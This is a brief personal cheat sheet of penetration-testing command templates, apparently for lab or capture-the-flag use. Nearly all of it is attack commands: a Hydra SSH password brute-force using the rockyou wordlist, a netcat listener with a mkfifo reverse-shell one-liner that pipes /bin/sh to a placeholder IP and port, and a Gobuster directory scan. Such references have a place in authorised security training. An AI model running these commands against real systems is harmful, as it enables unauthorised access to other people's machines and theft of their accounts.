# Common Tools Template Commands
## Author: JamesB9
## Description: 
File containing commands that to use for each tools. Change the commands to suite individual needs and use cases.

### Hydra

	hydra -l [username] -P /usr/share/wordlists/rockyou.txt [IP] -t 4 ssh
	
### NETCAT

	nc -lvnp [PORT]
	mkfifo /tmp/lol;nc [IP] [PORT] 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
	
### GoBuster

	gobuster dir -w /usr/share/wordlists/dirb/big.txt -u [URL] -x "html,php"
